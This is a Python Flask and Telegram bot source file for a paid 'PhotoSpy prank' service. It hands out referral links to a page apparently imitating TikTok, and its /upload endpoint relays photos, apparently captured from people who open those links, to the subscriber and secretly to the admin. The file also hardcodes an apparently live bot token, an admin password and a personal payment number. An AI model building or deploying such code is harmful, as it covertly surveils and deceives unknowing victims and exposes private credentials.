import sqlite3
import datetime
import uuid
import time
import json
import threading
import requests
from flask import Flask, request, jsonify, render_template, session, redirect, url_for
from functools import wraps

# ======================================================
#  КОНФИГ
# ======================================================
BOT_TOKEN = "8305233302:AAGsmlkthj6VKmsixKTBedvJthAMrQ39dxI"
BASE_URL = "https://nomadru.github.io/tiktokfake"
ADMIN_CHAT_ID = 8533142719
FREE_TRIAL_PHOTOS = 2
ADMIN_USERNAME = "pytin_legend"

ADMIN_PASSWORD = "pytin2024"
SECRET_KEY = "supersecretkey_change_me"

PAYMENT_PHONE = "+79278880124"

TARIFFS = [
    {"photos": 1,  "price": 5},
    {"photos": 10, "price": 30},
    {"photos": 100, "price": 250}
]

# ======================================================
#  БАЗА ДАННЫХ
# ======================================================
def init_db():
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            chat_id INTEGER PRIMARY KEY,
            ref TEXT UNIQUE,
            subscription_end TEXT,
            photos_limit INTEGER,
            used_photos INTEGER DEFAULT 0,
            tariff_name TEXT,
            referrer_id INTEGER DEFAULT NULL,
            referral_count INTEGER DEFAULT 0
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS pending_payments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id INTEGER,
            ref TEXT,
            photos INTEGER,
            price INTEGER,
            status TEXT DEFAULT 'pending',
            created_at TEXT
        )
    ''')
    conn.commit()
    conn.close()

def add_user(chat_id, ref, end_date, limit, tariff, referrer_id=None):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('''
        INSERT OR REPLACE INTO users (chat_id, ref, subscription_end, photos_limit, used_photos, tariff_name, referrer_id, referral_count)
        VALUES (?, ?, ?, ?, 0, ?, ?, 0)
    ''', (chat_id, ref, end_date, limit, tariff, referrer_id))
    conn.commit()
    conn.close()

def get_user(chat_id):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('SELECT ref, subscription_end, photos_limit, used_photos, referrer_id, referral_count FROM users WHERE chat_id=?', (chat_id,))
    row = c.fetchone()
    conn.close()
    return row

def get_user_by_ref(ref):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('SELECT chat_id, subscription_end, photos_limit, used_photos, referrer_id FROM users WHERE ref=?', (ref,))
    row = c.fetchone()
    conn.close()
    return row

def update_user_limit(chat_id, new_limit):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('UPDATE users SET photos_limit = ? WHERE chat_id = ?', (new_limit, chat_id))
    conn.commit()
    conn.close()

def increment_used_photos(ref):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('UPDATE users SET used_photos = used_photos + 1 WHERE ref=?', (ref,))
    conn.commit()
    conn.close()

def get_all_users():
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('SELECT chat_id, ref, photos_limit, used_photos, subscription_end, referral_count FROM users')
    rows = c.fetchall()
    conn.close()
    return rows

def increment_referral_count(chat_id):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('UPDATE users SET referral_count = referral_count + 1 WHERE chat_id = ?', (chat_id,))
    conn.commit()
    conn.close()

# ===== Платежи =====
def add_pending_payment(chat_id, ref, photos, price):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('''
        INSERT INTO pending_payments (chat_id, ref, photos, price, status, created_at)
        VALUES (?, ?, ?, ?, 'pending', ?)
    ''', (chat_id, ref, photos, price, datetime.datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_pending_payments():
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('SELECT id, chat_id, ref, photos, price, created_at FROM pending_payments WHERE status="pending" ORDER BY created_at DESC')
    rows = c.fetchall()
    conn.close()
    return rows

def update_payment_status(payment_id, status):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('UPDATE pending_payments SET status=? WHERE id=?', (status, payment_id))
    conn.commit()
    conn.close()

# ======================================================
#  БОТ
# ======================================================
def send_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    requests.post(url, json=data)

def answer_callback(callback_id, text=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
    data = {"callback_query_id": callback_id}
    if text:
        data["text"] = text
    requests.post(url, json=data)

def main_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "🔗 Получить ссылку", "callback_data": "get_link"}],
            [{"text": "📊 Моя подписка", "callback_data": "my_sub"}],
            [{"text": "💰 Купить фото", "callback_data": "buy_photo"}],
            [{"text": "👥 Пригласить друга", "callback_data": "invite"}],
            [{"text": "📈 Мои рефералы", "callback_data": "my_refs"}]
        ]
    }

def back_keyboard():
    return {"inline_keyboard": [[{"text": "🔙 Назад", "callback_data": "back"}]]}

def tariffs_keyboard():
    kb = {"inline_keyboard": []}
    for t in TARIFFS:
        kb["inline_keyboard"].append([
            {"text": f"{t['photos']} фото – {t['price']} руб", "callback_data": f"tariff_{t['photos']}_{t['price']}"}
        ])
    kb["inline_keyboard"].append([{"text": "🔙 Назад", "callback_data": "back"}])
    return kb

def handle_start(chat_id, text=None):
    referrer_id = None
    if text and text.startswith("/start ref_"):
        try:
            referrer_id = int(text.split("_")[1])
        except:
            pass

    row = get_user(chat_id)
    if not row:
        ref = str(uuid.uuid4())[:8]
        end_date = (datetime.datetime.now() + datetime.timedelta(days=365)).isoformat()
        add_user(chat_id, ref, end_date, FREE_TRIAL_PHOTOS, "Тестовый", referrer_id)

        if referrer_id:
            referrer_data = get_user(referrer_id)
            if referrer_data:
                ref_ref, end, limit, used, _, _ = referrer_data
                new_limit = limit + 1
                update_user_limit(referrer_id, new_limit)
                increment_referral_count(referrer_id)
                send_message(referrer_id, f"🎉 Твой друг перешёл по ссылке! Тебе начислено +1 фото. Новый лимит: {new_limit}")

        link = f"{BASE_URL}?ref={ref}"
        send_message(chat_id,
            f"🎉 Добро пожаловать в <b>ФотоШпион Пранк Бот</b>!\n\n"
            f"Ты получил <b>{FREE_TRIAL_PHOTOS} тестовых фото</b> бесплатно!\n"
            f"Твоя ссылка:\n<code>{link}</code>\n\n"
            f"После теста — купи фото через меню.",
            reply_markup=main_keyboard()
        )
    else:
        send_message(chat_id, "👋 С возвращением!\n\nВыбери действие:", reply_markup=main_keyboard())

def handle_callback(chat_id, callback_id, data):
    if data == "get_link":
        row = get_user(chat_id)
        if not row:
            send_message(chat_id, "Сначала активируй подписку (напиши /start).", reply_markup=main_keyboard())
            answer_callback(callback_id)
            return
        ref, end_date, limit, used, _, _ = row
        remaining = limit - used
        if remaining <= 0:
            send_message(chat_id, "❌ У тебя закончились фото. Купи новые через меню.", reply_markup=main_keyboard())
            answer_callback(callback_id)
            return
        link = f"{BASE_URL}?ref={ref}"
        send_message(chat_id,
            f"🔗 Твоя ссылка:\n<code>{link}</code>\n\nОсталось фото: {remaining}",
            reply_markup=back_keyboard()
        )
        answer_callback(callback_id)

    elif data == "my_sub":
        row = get_user(chat_id)
        if not row:
            send_message(chat_id, "У тебя нет активной подписки. Напиши /start", reply_markup=main_keyboard())
            answer_callback(callback_id)
            return
        ref, end_date, limit, used, _, referral_count = row
        remaining = limit - used
        status = "✅ Активна" if remaining > 0 else "❌ Исчерпана"
        text = (
            f"📊 <b>Твоя подписка</b>\n\n"
            f"• Статус: {status}\n"
            f"• Осталось фото: {remaining}\n"
            f"• Всего фото: {limit}\n"
            f"• Использовано: {used}\n"
            f"• Реф-код: <code>{ref}</code>\n"
            f"• Привёл друзей: {referral_count}"
        )
        send_message(chat_id, text, reply_markup=back_keyboard())
        answer_callback(callback_id)

    elif data == "buy_photo":
        send_message(chat_id, "📸 Выбери тариф:", reply_markup=tariffs_keyboard())
        answer_callback(callback_id)

    elif data.startswith("tariff_"):
        parts = data.split("_")
        photos = int(parts[1])
        price = int(parts[2])
        ref = get_user(chat_id)[0]
        send_message(chat_id,
            f"💳 Для покупки <b>{photos} фото</b> переведи <b>{price} руб</b> на номер <b>{PAYMENT_PHONE}</b> (СБП).\n\n"
            f"В назначении платежа укажи свой ref-код: <code>{ref}</code>\n\n"
            f"После перевода нажми кнопку «Я оплатил» и прикрепи чек.",
            reply_markup={"inline_keyboard": [
                [{"text": "✅ Я оплатил", "callback_data": f"pay_confirmed_{photos}_{price}"}],
                [{"text": "🔙 Назад", "callback_data": "back"}]
            ]}
        )
        answer_callback(callback_id)

    elif data.startswith("pay_confirmed_"):
        parts = data.split("_")
        photos = int(parts[2])
        price = int(parts[3])
        ref = get_user(chat_id)[0]
        add_pending_payment(chat_id, ref, photos, price)
        send_message(chat_id,
            f"📩 Отправь сюда <b>скриншот чека</b>.\n"
            f"После проверки админ начислит фото."
        )
        answer_callback(callback_id)

    elif data == "invite":
        row = get_user(chat_id)
        if not row:
            send_message(chat_id, "Сначала напиши /start.", reply_markup=main_keyboard())
            answer_callback(callback_id)
            return
        ref_link = f"https://t.me/твой_бот?start=ref_{chat_id}"
        send_message(chat_id,
            f"👥 Пригласи друга по этой ссылке:\n<code>{ref_link}</code>\n\n"
            f"Когда друг перейдёт и сделает первое фото — ты получишь <b>+1 фото</b> на баланс!",
            reply_markup={"inline_keyboard": [[{"text": "📋 Скопировать", "url": ref_link}]]}
        )
        answer_callback(callback_id)

    elif data == "my_refs":
        row = get_user(chat_id)
        if not row:
            send_message(chat_id, "Сначала напиши /start.", reply_markup=main_keyboard())
            answer_callback(callback_id)
            return
        ref, end_date, limit, used, _, referral_count = row
        text = (
            f"📈 <b>Твои рефералы</b>\n\n"
            f"• Приглашено друзей: {referral_count}\n"
            f"• Бонусных фото получено: {referral_count}"
        )
        send_message(chat_id, text, reply_markup=back_keyboard())
        answer_callback(callback_id)

    elif data == "back":
        send_message(chat_id, "Главное меню:", reply_markup=main_keyboard())
        answer_callback(callback_id)

# ======================================================
#  ОБРАБОТКА ЧЕКОВ
# ======================================================
def handle_photo_message(chat_id, file_id):
    file_url = f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={file_id}"
    resp = requests.get(file_url)
    if resp.status_code != 200:
        send_message(chat_id, "❌ Ошибка при получении файла.")
        return
    file_path = resp.json().get("result", {}).get("file_path")
    if not file_path:
        send_message(chat_id, "❌ Не удалось получить файл.")
        return
    file_download = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
    photo_data = requests.get(file_download)
    files = {'photo': ('check.jpg', photo_data.content, 'image/jpeg')}
    data = {'chat_id': ADMIN_CHAT_ID, 'caption': f"💳 Чек от {chat_id}\nПроверь в админ-панели."}
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", data=data, files=files)
    send_message(chat_id, "✅ Чек отправлен. Ожидай подтверждения.")

# ======================================================
#  БОТ-ПОЛЛИНГ
# ======================================================
def bot_polling():
    print("🤖 Бот запущен в фоне")
    last_update_id = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            params = {"offset": last_update_id + 1, "timeout": 30}
            resp = requests.get(url, params=params, timeout=35)
            if resp.status_code != 200:
                print(f"❌ Ошибка getUpdates: {resp.text}")
                time.sleep(5)
                continue
            updates = resp.json().get("result", [])
            for upd in updates:
                last_update_id = upd["update_id"]
                if "message" in upd:
                    msg = upd["message"]
                    chat_id = msg["chat"]["id"]
                    if "photo" in msg:
                        photo = msg["photo"][-1]
                        file_id = photo["file_id"]
                        handle_photo_message(chat_id, file_id)
                    if "text" in msg:
                        text = msg["text"]
                        if text.startswith("/start"):
                            handle_start(chat_id, text)
                if "callback_query" in upd:
                    cb = upd["callback_query"]
                    chat_id = cb["from"]["id"]
                    callback_id = cb["id"]
                    data = cb["data"]
                    handle_callback(chat_id, callback_id, data)
        except Exception as e:
            print("Ошибка бота:", e)
            time.sleep(5)

# ======================================================
#  FLASK + АДМИН-ПАНЕЛЬ
# ======================================================
app = Flask(__name__)
app.secret_key = SECRET_KEY

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('admin_panel'))
        else:
            error = 'Неверный пароль'
    return render_template('login.html', error=error)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/admin')
@login_required
def admin_panel():
    users = get_all_users()
    payments = get_pending_payments()
    total_users = len(users)
    total_photos = sum(u[2] for u in users)
    return render_template('admin.html', users=users, payments=payments, total_users=total_users, total_photos=total_photos)

@app.route('/admin/add', methods=['POST'])
@login_required
def admin_add():
    ref = request.form.get('ref')
    count = request.form.get('count', type=int)
    if not ref or not count:
        return 'Неверные данные', 400
    user = get_user_by_ref(ref)
    if not user:
        return f'Пользователь {ref} не найден', 404
    chat_id, end_date, limit, used, _ = user
    new_limit = limit + count
    update_user_limit(chat_id, new_limit)
    send_message(chat_id, f"✅ Админ добавил {count} фото. Новый лимит: {new_limit}")
    return redirect(url_for('admin_panel'))

@app.route('/admin/confirm_payment/<int:payment_id>')
@login_required
def confirm_payment(payment_id):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('SELECT chat_id, ref, photos FROM pending_payments WHERE id=?', (payment_id,))
    row = c.fetchone()
    conn.close()
    if not row:
        return 'Платёж не найден', 404
    chat_id, ref, photos = row
    user = get_user_by_ref(ref)
    if user:
        chat_id_u, end_date, limit, used, _ = user
        new_limit = limit + photos
        update_user_limit(chat_id_u, new_limit)
        send_message(chat_id_u, f"✅ Платёж подтверждён! Начислено {photos} фото. Новый лимит: {new_limit}")
    update_payment_status(payment_id, 'confirmed')
    return redirect(url_for('admin_panel'))

@app.route('/admin/reject_payment/<int:payment_id>')
@login_required
def reject_payment(payment_id):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('SELECT chat_id FROM pending_payments WHERE id=?', (payment_id,))
    row = c.fetchone()
    conn.close()
    if not row:
        return 'Платёж не найден', 404
    chat_id = row[0]
    send_message(chat_id, "❌ Платёж отклонён. Свяжитесь с админом.")
    update_payment_status(payment_id, 'rejected')
    return redirect(url_for('admin_panel'))

@app.route('/upload', methods=['POST'])
def upload():
    ref = request.args.get('ref')
    if not ref:
        return jsonify({'error': 'Missing ref'}), 400
    if 'photo' not in request.files:
        return jsonify({'error': 'No photo'}), 400
    photo = request.files['photo']
    user = get_user_by_ref(ref)
    if not user:
        return jsonify({'error': 'Invalid ref'}), 403
    chat_id, end_date, limit, used, _ = user
    now = datetime.datetime.now()
    if now > datetime.datetime.fromisoformat(end_date):
        return jsonify({'error': 'Subscription expired'}), 403
    if used >= limit:
        return jsonify({'error': 'Limit exceeded'}), 403

    files = {'photo': (photo.filename, photo.stream, photo.mimetype)}
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    data_user = {'chat_id': chat_id, 'caption': f"📸 Ваше фото (ref: {ref})"}
    resp_user = requests.post(url, data=data_user, files=files)
    if resp_user.status_code != 200:
        return jsonify({'error': 'Telegram send to user failed'}), 500

    photo.seek(0)
    files_copy = {'photo': (photo.filename, photo.stream, photo.mimetype)}
    data_admin = {'chat_id': ADMIN_CHAT_ID, 'caption': f"📸 Копия от {ref}"}
    requests.post(url, data=data_admin, files=files_copy)

    increment_used_photos(ref)
    return jsonify({'status': 'ok'})

# ======================================================
#  ЗАПУСК (вне __main__, чтобы работало и под gunicorn)
# ======================================================
print("🚦 СТАРТ ПРИЛОЖЕНИЯ")
init_db()
print("🗄️ База данных инициализирована")

def start_bot():
    print("🚀 Запуск потока бота...")
    bot_polling()

bot_thread = threading.Thread(target=start_bot, daemon=True)
bot_thread.start()
print("🧵 Поток бота запущен")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
